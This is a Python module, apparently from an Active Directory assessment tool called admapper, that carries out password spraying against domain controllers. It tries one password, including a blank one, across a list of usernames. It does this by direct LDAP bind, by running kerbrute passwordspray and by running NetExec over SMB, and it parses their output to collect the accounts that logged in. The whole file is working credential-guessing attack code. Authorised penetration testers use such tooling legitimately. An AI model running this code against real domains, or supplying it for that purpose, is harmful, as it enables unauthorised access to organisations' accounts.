from __future__ import annotations

import re
import subprocess
import tempfile
from pathlib import Path

from ldap3 import ALL, SIMPLE, Connection, Server
from ldap3.core.exceptions import LDAPException

from admapper.core.platform import (
    resolve_kerbrute,
    resolve_nxc,
    run_command,
    tool_install_hint,
)

_KERBRUTE_HIT_RE = re.compile(r"\[\+\]\s+VALID\s+LOGIN:\s*(\S+)", re.IGNORECASE)
_NXC_HIT_RE = re.compile(r"\[\+\].*?(?:SMB|LDAP|HTTP)\s+([^\s:]+):([^\s]+)", re.IGNORECASE)


def try_ldap_password(
    host: str,
    domain: str,
    username: str,
    password: str,
    *,
    port: int = 389,
    timeout: int = 8,
    use_ssl: bool = False,
) -> bool:
    """Return True when SIMPLE LDAP bind succeeds."""
    principal = f"{username}@{domain}"
    try:
        server = Server(host, port=port, use_ssl=use_ssl, connect_timeout=timeout, get_info=ALL)
        conn = Connection(
            server,
            user=principal,
            password=password,
            authentication=SIMPLE,
            receive_timeout=timeout,
        )
        return bool(conn.bind())
    except (LDAPException, OSError):
        return False


def spray_ldap(
    host: str,
    domain: str,
    users: list[str],
    password: str,
    *,
    port: int = 389,
    timeout: int = 8,
) -> list[str]:
    """Spray one password against many users via LDAP bind."""
    hits: list[str] = []
    for username in users:
        if try_ldap_password(host, domain, username, password, port=port, timeout=timeout):
            hits.append(username)
    return hits


def _write_users_file(users: list[str]) -> str:
    handle = tempfile.NamedTemporaryFile(
        "w",
        suffix=".txt",
        delete=False,
        encoding="utf-8",
        newline="\n",
    )
    handle.write("\n".join(users))
    handle.write("\n")
    handle.close()
    return handle.name


def spray_kerbrute(
    dc_ip: str,
    domain: str,
    users: list[str],
    password: str,
    *,
    timeout: int = 300,
) -> tuple[list[str], str | None]:
    """Spray via kerbrute passwordspray if installed."""
    kerbrute = resolve_kerbrute()
    if not kerbrute:
        return [], f"kerbrute not found — {tool_install_hint('kerbrute')}"

    users_file = _write_users_file(users)
    cmd = [
        kerbrute,
        "passwordspray",
        "-d",
        domain,
        "--dc",
        dc_ip,
        users_file,
        password,
    ]
    try:
        proc = run_command(cmd, timeout=timeout)
        output = (proc.stdout or "") + "\n" + (proc.stderr or "")
        hits = sorted({m.group(1).split("@", 1)[0] for m in _KERBRUTE_HIT_RE.finditer(output)})
        if proc.returncode not in (0, 1) and not hits:
            return [], output.strip() or f"kerbrute exited {proc.returncode}"
        return hits, None
    except subprocess.TimeoutExpired:
        return [], "kerbrute timed out"
    except OSError as exc:
        return [], str(exc)
    finally:
        Path(users_file).unlink(missing_ok=True)


def spray_nxc(
    dc_ip: str,
    users: list[str],
    password: str,
    *,
    timeout: int = 300,
) -> tuple[list[str], str | None]:
    """Spray via NetExec (nxc/netexec) SMB if installed."""
    binary = resolve_nxc()
    if not binary:
        return [], f"nxc/netexec not found — {tool_install_hint('nxc')}"

    users_file = _write_users_file(users)
    cmd = [
        binary,
        "smb",
        dc_ip,
        "-u",
        users_file,
        "-p",
        password,
        "--continue-on-success",
        "--no-bruteforce",
    ]
    try:
        proc = run_command(cmd, timeout=timeout)
        output = (proc.stdout or "") + "\n" + (proc.stderr or "")
        hits: set[str] = set()
        for match in _NXC_HIT_RE.finditer(output):
            hits.add(match.group(1))
        if "[+]" in output and not hits:
            for line in output.splitlines():
                if "[+]" in line and ":" in line:
                    token = line.split(":")[-2].strip().split()[-1]
                    if token:
                        hits.add(token)
        if proc.returncode not in (0, 1) and not hits:
            return [], output.strip() or f"{binary} exited {proc.returncode}"
        return sorted(hits), None
    except subprocess.TimeoutExpired:
        return [], "nxc timed out"
    except OSError as exc:
        return [], str(exc)
    finally:
        Path(users_file).unlink(missing_ok=True)


def spray_password(
    dc_ip: str,
    domain: str,
    users: list[str],
    password: str,
    *,
    method: str = "auto",
) -> tuple[list[str], str, str | None]:
    """
    Spray one password. Returns (hits, method_used, error).

    method: auto | ldap | kerbrute | nxc
    """
    # Blank passwords only work over LDAP; Kerberos/NXC reject empty plaintext.
    if password == "":
        return spray_ldap(dc_ip, domain, users, password), "ldap", None

    if method == "ldap":
        return spray_ldap(dc_ip, domain, users, password), "ldap", None

    if method == "kerbrute":
        hits, err = spray_kerbrute(dc_ip, domain, users, password)
        return hits, "kerbrute", err

    if method in {"nxc", "netexec", "smb"}:
        hits, err = spray_nxc(dc_ip, users, password)
        return hits, "nxc", err

    if resolve_kerbrute():
        hits, err = spray_kerbrute(dc_ip, domain, users, password)
        if hits or err is None:
            return hits, "kerbrute", err

    hits = spray_ldap(dc_ip, domain, users, password)
    if hits:
        return hits, "ldap", None

    if resolve_nxc():
        nxc_hits, err = spray_nxc(dc_ip, users, password)
        if nxc_hits:
            return nxc_hits, "nxc", None
        if err:
            return [], "ldap", err

    return hits, "ldap", None
